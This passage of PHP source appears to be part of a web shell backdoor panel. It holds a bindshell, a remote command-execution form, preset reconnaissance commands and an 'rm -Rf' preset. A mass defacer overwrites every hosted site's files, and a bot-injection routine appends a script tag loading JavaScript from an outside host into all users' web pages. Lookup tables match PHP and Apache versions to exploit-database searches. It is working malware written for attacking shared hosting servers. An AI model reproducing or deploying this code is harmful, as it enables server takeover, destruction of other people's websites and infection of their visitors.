			$mysock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			socket_bind($mysock, $address, $port) or die("Error: Can't bind to <" .$address. ":" .$port. ">\n");
			socket_listen($mysock, 5);
			$client = socket_accept($mysock);
			socket_write($client, "-= PHP Bindshell =-\n");
			while(1){
				socket_write($client, "> ");
				$input = socket_read($client, 1024);
				if(trim($input) == "quit") break;
					socket_write($client, $input);
			}
			socket_close($client);
			socket_close($mysock);
		}
	}

	function CommandExecute(){
		ob_start();

		$cmd = stripslashes($_POST['code']);
		$result = "<span class=\"PageTitle\">Commands Execution</span><br /><br />\n";
		$result .= "<table style=\"width:100%;\">\n<tr>\n<td style=\"vertical-align:top;width:550px;\">\n";
		$result .= "<form method=\"post\" action=\"?act=cmdexec\">\n";
		$result .= "Command:<br />\n";
		$result .= "<textarea rows=\"5\" cols=\"50\" id=\"code\" name=\"code\">".htmlspecialchars($cmd)."</textarea><br />\n";
		$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Execute\" /><br />\n</form>\n";

		if(isset($_POST['code'])){
			$result .= "<br />";
			$list = array("system","shell_exec","passthru","exec",);
			foreach($list as $func)
				if(function_exists($func) and is_callable($func)){
					$chosen = "yes";

					if($func($cmd)){
						break;
					}
				}

			if($chosen != "yes"){
				$result .= "Unable to execute commands on this server.";
			}
			else{
				$eresult = ob_get_contents();
				$res = (strlen($eresult) > 0) ? $eresult : $func($cmd) ;

				if($res == "")
					$result .= "Your command didn't return results.";
				else
					$result .= "Results:<br /><textarea rows=\"20\" cols=\"50\">".$res."</textarea><br />";
			}
		}

		ob_end_clean();

		$result .= "</td>\n<td style=\"vertical-align:top;\">\n";
		$result .= "<u>Useful Commands:</u><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='netstat -an | grep -i listen';\">View Open Ports</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='cut -d: -f1,2,3 /etc/passwd | grep ::';\">Find Users Without Password</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='cat /proc/version /proc/cpuinfo';\">View CPU Information</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='find / -perm -2 -ls';\">Find All Writeable Files & Folders</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='tar -cvf [BackupFileName].tar -c /home/[USER]/domains/[DOMAIN]/public_html/[FOLDER]';\">Create Backup File</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='rm -Rf';\">Run Format Box</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='perl [Perl File]';\">Run Perl Script</a><br />\n";
		$result .= "<a href=\"#\" onclick=\"javascript:document.getElementById('code').value='sed -i -e \'s/Owned by Pr0T3cT10n & Hyp3rInj3cT10n/g\' index.*';\">Mass Deface</a><br />\n";
		$result .= "</td>\n</tr>\n</table>\n";

		return $result;
	}

	function ViewPHPInfo(){
		$result = "<span class=\"PageTitle\">PHP Information</span><br /><br />";
		$result .= "Can't run phpinfo function because it blocked by the server.<br />";
		$result .= "Building new function...<br /><br />";

		if(function_exists("ini_get_all") and is_callable("ini_get_all")){
			$result .= "<center>\n<h2>PHP Core</h2>\n<div><table style=\"width:100%;\">\n<tr>\n<th>Directive</th><th>Local Value</th><th>Master Value</th><th>Access</th>\n</tr>\n";

			foreach(ini_get_all() as $key=>$each_ini){
				$row = "";
				$explode = explode(".",$key);
				$each_ini['local_value'] = GenerateColors($each_ini['local_value']);
				$each_ini['global_value'] = GenerateColors($each_ini['global_value']);

				if(isset($explode[1])){
					if($explode[0] != $last_module){
						$categories .= "</table></div><br /><br />\n";
						$categories .= "<div style=\"background-color:#3d0303;\">";
						$categories .= "<h2>".$explode[0]."</h2>\n";
						$categories .= "<table style=\"width:100%;\">\n";
						$categories .= "<tr>\n<th>Directive</th>\n<th>Local Value</th>\n<th>Master Value</th><th>Access</th>\n</tr>\n";
						$categories .= "<tr>\n<td>".$explode[1]."</td>\n";
						$categories .= "<td>".$each_ini['local_value']."</td>\n<td>".$each_ini['global_value']."</td>\n<td>".$each_ini['access']."</td>\n";
						$categories .= "</tr>\n";

						$last_module = $explode[0];
					}
					else{
						$categories .= "<tr>\n<td>".$explode[1]."</td>\n";
						$categories .= "<td>".$each_ini['local_value']."</td>\n<td>".$each_ini['global_value']."</td>\n<td>".$each_ini['access']."</td>\n";
						$categories .= "</tr>\n";
					}
				}
				else{
					$row .= "<tr>\n<td>".$key."</td>\n";
					$row .= "<td>".$each_ini['local_value']."</td>\n<td>".$each_ini['global_value']."</td>\n<td>".$each_ini['access']."</td>\n";
					$row .= "</tr>\n";
				}

				$result .= $row;
				$count++;
			}

			$result .= "</table><br />";
		}

		$result .= "<hr /><br /><h2>apache2handler</h2><table cellpadding=\"3\" style=\"width:100%;\">";

		if(function_exists("create_connection_status") and is_callable("create_connection_status"))
			$result .= "<tr><td>Connection Status </td><td>".create_connection_status()."</td></tr>";

		if(function_exists("apache_get_version") and is_callable("apache_get_version"))
			$result .= "<tr><td>Apache Version </td><td>".apache_get_version()."</td></tr>";

		if(isset($_SERVER['SERVER_ADMIN']))
			$result .= "<tr><td>Server Administrator </td><td>".$_SERVER['SERVER_ADMIN']."</td></tr>";

		if(isset($_SERVER['SERVER_ADDR']) and isset($_SERVER['SERVER_PORT']))
			$result .= "<tr><td>Hostname:Port </td><td>".$_SERVER['SERVER_ADDR'].":".$_SERVER['SERVER_PORT']."</td></tr>";

		if(function_exists("apache_get_modules") and is_callable("apache_get_modules")){
			$result .= "<tr><td>Loaded Modules </td><td>";

			foreach(apache_get_modules() as $module){
				if($count_modules == "10")
					$result .= "<br />";

				$result .= $module;

				if($count_modules == count($apache_modules)-1)
					$result .= ".";
				else
					$result .= ", ";

				$count_modules++;
			}

			$result .= "</td></tr></table><br />";
		}

		$result .= "<hr /><br /><h2>HTTP Headers Information</h2>";
		$result .= "<table cellpadding=\"3\" style=\"width:100%;\">";

		if(function_exists("apache_request_headers") and is_callable("apache_request_headers")){
			$result .= "<tr><th colspan=\"2\">HTTP Request Headers</th></tr>";

			foreach (apache_request_headers() as $header => $value)
				$result .= "<tr>\n<td>{$header}</td>\n<td>{$value}</td>\n</tr>\n";
		}

		if(function_exists("apache_response_headers") and is_callable("apache_response_headers")){
			$result .= "<tr><th colspan=\"2\">HTTP Response Headers</th></tr>";

			foreach (apache_response_headers() as $header => $value)
				$result .= "<tr>\n<td>{$header}</td>\n<td>{$value}</td>\n</tr>\n";
		}

		$result .= "</table><br /><hr /><br /><h2>Variables</h2><table style=\"width:100%;\"><tr><th>Variable</th><th>Value</th></tr>";

		foreach($_SERVER as $server_key=>$server_value){
			if(is_array($server_value)){
				$result .= "<tr>\n<td>_SERVER['".$server_key."']</td>\n<td><input type=\"text\" style=\"width:500px;\" value=\"";
				htmlspecialchars(print_r($server_value,true));
				$result .= "\" /></td>\n</tr>\n";
			}
			else
				$result .= "<tr>\n<td>_SERVER['".$server_key."']</td>\n<td><input type=\"text\" style=\"width:500px;\" value=\"".htmlspecialchars($server_value)."\" /></td>\n</tr>\n";
		}

		foreach($_ENV as $env_key=>$env_value)
			$result .= "<tr>\n<td>_ENV['".$env_key."']</td>\n<td><input type=\"text\" style=\"width:500px;\" value=\"".htmlspecialchars($env_value)."\" /></td>\n</tr>\n";

		$result .= $categories."</table><br /></center>";

		return $result;
	}

	function MassDefacer(){
		if(isset($_POST['submit']) && isset($_POST['message'])){ 
			$result .= "defacing..<br>\n"; 
			$myFile = "/etc/virtual/domainowners"; 
			$fh = @fopen($myFile, "r"); 
			$theData = @fread($fh, filesize($myFile)); 
			@fclose($fh); 
			$thedata = explode("<br />", nl2br($theData)); 
			foreach($thedata as $user){ 
				$path = explode(": ",$user); 
				$path[1] = "/home/" .$path[1]. "/public_html/"; 
				if(is_dir($path[1])){  
					foreach(array("htm", "html", "shtml", "css", "php", "js", "txt", "inc") as $extension){ 
						foreach(glob($path[1]. "*." .$extension) as $injectj00){ 
							$fp = @fopen($injectj00, "w"); 
							if(@fputs($fp, $_POST['message'])) 
								$result .= "<font color=\"green\">" .$injectj00. " was injected</font><br>\n"; 
							else 
								$result .= "<font color=\"white\">failed to inject " .$injectj00. "</font><br>\n"; 
						} 
					} 
				} 
				else 
					$result .= "<b><font color=\"white\">" .$path[1]. " is not available!</font></b><br>\n"; 
			} 
		} 
		else{
			$result = "<span class=\"PageTitle\">Mass Defacer</span><br /><br />";
			$result .= "<form method=\"post\" action=\"?act=mass\">\nMessage: (You can use HTML)<br />\n";
			$result .= "<textarea rows=\"5\" cols=\"50\" id=\"message\" name=\"message\">".htmlspecialchars($deface)."</textarea><br />";
			$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Start\" /></form><br /><br /><small>Built By L[s]D</small>";
		}
		
		return $result;
	
	}
	
	function BotCode(){
		if(isset($_POST['submit'])){ 
			$result .= "injecting..<br>\n"; 
			$myFile = "/etc/virtual/domainowners"; 
			$fh = @fopen($myFile, "r"); 
			$theData = @fread($fh, filesize($myFile)); 
			@fclose($fh); 
			$thedata = explode("\n", $theData); 
			foreach($thedata as $user){ 
				$path = explode(": ",$user); 
				$path[1] = "/home/" .$path[1]. "/domains/".$path[0]."/public_html/".$_POST['dir_to_inject']."/"; 
				if(is_dir($path[1])){  
					foreach(array("htm", "html", "shtml", "css", "php", "js", "txt", "inc") as $extension){ 
						foreach(glob($path[1]. "*." .$extension) as $injectj00){ 
							$fp = @fopen($injectj00, "a+"); 
							if(@fputs($fp, "<? if(\$_REQUEST['CODE']==\"\") echo \"<script src='http://www.planetnana.co.il/shin271/_uacct.js'></script>\"; ?>")) 
								$result .= "<font color=\"green\">" .$injectj00. " was injected</font><br>\n"; 
							else 
								$result .= "<font color=\"white\">failed to inject " .$injectj00. "</font><br>\n"; 
						} 
					} 
				} 
				else 
					$result .= "<b><font color=\"white\">" .$path[1]. " is not available!</font></b><br>\n"; 
			} 
		} 
		else{
			$result = "<span class=\"PageTitle\">Bot Code Injection</span><br /><br />";
			$result .= "<form method=\"post\" action=\"?act=bot\">\nInject To Dir<br />\n";
			$result .= "<input type=\"text\" name=\"dir_to_inject\" value=\"".htmlspecialchars($dir_to_inject)."\"><small> eg. forum <b>or</b> ipb</small><br />";
			$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Start\" /></form><br /><br /><small>Built By L[s]D</small>";
		}
		
		return $result;
	
	}
	
	function UHNav(){ 
		$myFile = "/etc/virtual/domainowners";
		$fh = @fopen($myFile, "r");
		$theData = @fread($fh, filesize($myFile));
		@fclose($fh);
		$thedata = explode("\n", $theData); 
		foreach($thedata as $user){ 
			$path = explode(": ",$user); 
			$result .= "<a href=\"?act=list&dir=/home/".$path[1]."/domains/".$path[0]."/public_html/\">".$path[1]."</a> <br />";
		}
		return $result;
	}

	function ViewPHPBugs(){
		$ver = $this->phpv;
		$result = "<span class=\"PageTitle\">View PHP Bugs</span><br /><br />";

		$version["5.2.4"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP 5.2.4 ionCube extension safe_mode / disable_functions Bypass"
				);
		$version["5.2.3"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.4.7 / 5.2.3 MySQL/MySQLi Safe Mode Bypass Vulnerability",
					"PHP 5.2.3 php_ntuser ntuser_getuserlist() Local Buffer Overflow PoC",
					"PHP <= 5.2.3 (php_win32sti) Local Buffer Overflow Exploit",
					"PHP <= 5.2.3 (php_win32sti) Local Buffer Overflow Exploit (2)",
					"PHP <= 5.2.3 snmpget() object id Local Buffer Overflow Exploit (EDI)",
					"PHP 5.2.3 win32std ext. safe_mode/disable_functions Protections Bypass",
					"PHP <= 5.2.3 snmpget() object id Local Buffer Overflow Exploit",
					"PHP 5.2.3 glob() Denial of Service Exploit",
					"PHP 5.2.3 bz2 com_print_typeinfo() Denial of Service Exploit",
					"PHP 5.2.3 Tidy extension Local Buffer Overflow Exploit"
				);
		$version["5.2.1"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP < 4.4.5 / 5.2.1 _SESSION unset() Local Exploit",
					"PHP < 4.4.5 / 5.2.1 _SESSION Deserialization Overwrite Exploit",
					"PHP 5.2.1 with PECL phpDOC Local Buffer Overflow Exploit",
					"PHP 5.2.1 unserialize() Local Information Leak Exploit",
					"PHP <= 4.4.6 / 5.2.1 ext/gd Already Freed Resources Usage Exploit",
					"PHP <= 5.2.1 hash_update_file() Freed Resource Usage Exploit",
					"PHP <= 4.4.6 / 5.2.1 array_user_key_compare() ZVAL dtor Local Exploit",
					"PHP <= 5.2.1 session_regenerate_id() Double Free Exploit",
					"PHP < 4.4.5 / 5.2.1 (shmop) SSL RSA Private-Key Disclosure Exploit",
					"PHP < 4.4.5 / 5.2.1 (shmop Functions) Local Code Execution Exploit",
					"PHP < 4.4.5 / 5.2.1 php_binary Session Deserialization Information Leak",
					"PHP <= 5.2.1 substr_compare() Information Leak Exploit",
					"5.2.1 WDDX Session Deserialization Information Leak",
					"PHP 5.2.0/5.2.1 Rejected Session ID Double Free Exploit"
				);
		$version["5.2.0"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 5.2.0 (php_iisfunc.dll) Local Buffer Overflow PoC (win32)",
					"PHP <= 5.2.0 (php_win32sti) Local Buffer Overflow PoC (win32)",
					"PHP 5.2.0 header() Space Trimming Buffer Underflow Exploit (MacOSX)",
					"PHP 5.2.0 / PHP with PECL ZIP <= 1.8.3 zip:// URL Wrapper BoF Exploit",
					"PHP <= 5.2.0 ext/filter FDF Post Filter Bypass Exploit",
					"PHP 5.2.0 ext/filter Space Trimming Buffer Underflow Exploit (MacOSX)",
					"PHP 5.2.0/5.2.1 Rejected Session ID Double Free Exploit"
				);
		$version["4.4.7"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.4.7 / 5.2.3 MySQL/MySQLi Safe Mode Bypass Vulnerability"
				);
		$version["4.4.6"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.4.6 / 5.2.1 ext/gd Already Freed Resources Usage Exploit",
					"PHP <= 4.4.6 / 5.2.1 array_user_key_compare() ZVAL dtor Local Exploit",
					"PHP <= 4.4.6 ibase_connect() Local Buffer Overflow Exploit",
					"PHP <= 4.4.6 mssql_[p]connect() Local Buffer Overflow Exploit",
					"PHP 4.4.3 - 4.4.6 phpinfo() Remote XSS Vulnerability",
					"PHP 4.4.6 crack_opendict() Local Buffer Overflow Exploit PoC",
					"PHP 4.4.6 cpdf_open() Local Source Code Discslosure PoC",
					"PHP 4.4.6 snmpget() object id Local Buffer Overflow Exploit PoC"
				);
		$version["4.3.7"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP < 4.4.5 / 5.2.1 php_binary Session Deserialization Information Leak"
				);
		$version["4.4.5"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP 4.4.5 / 4.4.6 session_decode() Double Free Exploit PoC",
					"PHP < 4.4.5 / 5.2.1 _SESSION unset() Local Exploit",
					"PHP < 4.4.5 / 5.2.1 _SESSION Deserialization Overwrite Exploit",
					"PHP < 4.4.5 / 5.2.1 WDDX Session Deserialization Information Leak",
					"PHP < 4.4.5 / 5.2.1 php_binary Session Deserialization Information Leak",
					"PHP 4.4.3 - 4.4.6 phpinfo() Remote XSS Vulnerability",
					"PHP < 4.4.5 / 5.2.1 (shmop) SSL RSA Private-Key Disclosure Exploit",
					"PHP < 4.4.5 / 5.2.1 (shmop Functions) Local Code Execution Exploit"
				);
		$version["4.4.4"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC", "PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit", "PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass", "PHP <= 4.4.4 / 5.1.6 htmlentities() Local Buffer Overflow PoC",
					"PHP <= 4.4.4 unserialize() ZVAL Reference Counter Overflow Exploit PoC",
					"PHP 4.4.3 - 4.4.6 phpinfo() Remote XSS Vulnerability");
		$version["4.4.3"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.4.3 / 5.1.4 (objIndex) Local Buffer Overflow Exploit PoC",
					"PHP <= 4.4.3 / 5.1.4 (sscanf) Local Buffer Overflow Exploit",
					"PHP 4.4.3 - 4.4.6 phpinfo() Remote XSS Vulnerability"
				);
		$version["4.4.0"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.4.0 (mysql_connect function) Local Buffer Overflow Exploit"
				);
		$version["4.3.7"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP <= 4.3.7 / 5.0.0RC3 memory_limit Remote Exploit",
					"PHP <= 4.3.7 openlog() Buffer Overflow Exploit"
				);
		$version["3.0.16"] = array(
					"PHP (php-exec-dir) Patch Command Access Restriction Bypass",
					"PHP wddx_deserialize() String Append Crash Exploit",
					"PHP COM extensions (inconsistent Win32) safe_mode Bypass Exploit",
					"PHP php_gd2.dll imagepsloadfont Local Buffer Overflow PoC",
					"PHP 5.x (win32service) Local Safe Mode Bypass Exploit",
					"PHP mSQL (msql_connect) Local Buffer Overflow PoC",
					"PHP mSQL (msql_connect) Local Buffer Overflow Exploit",
					"PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit",
					"PHP Perl Extension Safe_mode Bypass Exploit",
					"PHP 5.x COM functions safe_mode and disable_function bypass",
					"PHP 3.0.16 / 4.0.2 Remote Format Overflow Exploit"
				);

		if(isset($version[$ver]))
			foreach($version[$ver] as $vuln)
				$result .= "<a href=\"http://milw0rm.com/search.php?dong=" .$vuln. "\" target=\"_blank\">" .$vuln. "</a><br />\n";
		else
			$result .= "There is no information in the shell database about this php version.<br />";
		$result .= "<br />";
		return $result;
	}

	function ViewApacheBugs(){
		$starttext = "<span class=\"PageTitle\">View Apache Bugs</span><br /><br />";
		$result = $starttext;
		$ver = @apache_get_version();

		$version["2.2.3"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache HTTP Server 2.x Memory Leak Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)"
				);
		$version["2.0.59"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache HTTP Server 2.x Memory Leak Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache < 1.3.37, 2.0.59, 2.2.3 (mod_rewrite) Remote Overflow PoC"
				);
		$version["2.0.58"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache HTTP Server 2.x Memory Leak Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache 2.0.58 mod_rewrite Remote Overflow Exploit (win2k3)"
				);
		$version["2.0.52"] = array(
					"Apache <= 2.0.52 HTTP GET request Denial of Service Exploit",
					"Apache 2.0.52 Multiple Space Header Denial of Service Exploit (v2)",
					"Apache 2.0.52 Multiple Space Header DoS (Perl code)",
					"Apache 2.0.52 Multiple Space Header DoS (c code)"
				);
		$version["2.0.48"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache 1.3.*-2.0.48 mod_userdir Remote Users Disclosure Exploit"
				);
		$version["2.0.45"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache HTTP Server 2.x Memory Leak Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache <= 2.0.45 APR Remote Exploit -Apache-Knacker.pl"
				);
		$version["2.0.44"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache HTTP Server 2.x Memory Leak Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache <= 2.0.44 Linux Remote Denial of Service Exploit"
				);
		$version["1.3.37"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache 1.3.*-2.0.48 mod_userdir Remote Users Disclosure Exploit",
					"Apache 1.3.x mod_mylo Remote Code Execution Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache < 1.3.37, 2.0.59, 2.2.3 (mod_rewrite) Remote Overflow PoC"
				);
		$version["1.3.34"] = array(
					"Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit"
				);
		$version["1.3.33"] = array(
					"Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit"
				);
		$version["1.3.31"] = array(
					"Apache HTTPd Arbitrary Long HTTP Headers DoS",
					"Apache 1.3.*-2.0.48 mod_userdir Remote Users Disclosure Exploit",
					"Apache 1.3.x mod_mylo Remote Code Execution Exploit",
					"Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)",
					"Apache <= 1.3.31 mod_include Local Buffer Overflow Exploit"
				);

		foreach($version as $vuln_version => $vulns)
			if(strstr($ver, $vuln_version))
				foreach($vulns as $vuln)
					$result.= "<a href=\"http://milw0rm.com/search.php?dong=" .$vuln. "\">" .$vuln. "</a><br />\n";

		if($result == $starttext)
			$result .= "There is no information in the shell database about this apache version.<br />";

		$result .= "<br />";
		return $result;
	}

}

function GenerateColors($value){
	if(strlen($value) <= 0){ //No Value?
		$value = "<em style=\"color:gray;\">no value</em>\n";
	}
	else{
		if($value == "1"){ //Enabled?
			$value = "<span style=\"color:green;\">enabled</span>\n";
		}
		else if($value == "0"){ //Disabled?
			$value = "<span style=\"color:red;\">disabled</span>\n";
		}
		else if($value == "-1"){ //Unlimited?
			$value = "<span style=\"color:orange;\">unlimited</span>\n";
		}
	}

	//Colors in value?
	$value = preg_replace("/(#.+)(\S)/i","<span style=\"color:\\1\\2;\">\\1\\2</span>\n",$value);

	//& => &amp; (Valid XHTML)
	$value = str_replace("&","&amp;",$value);

	return $value;
}
?>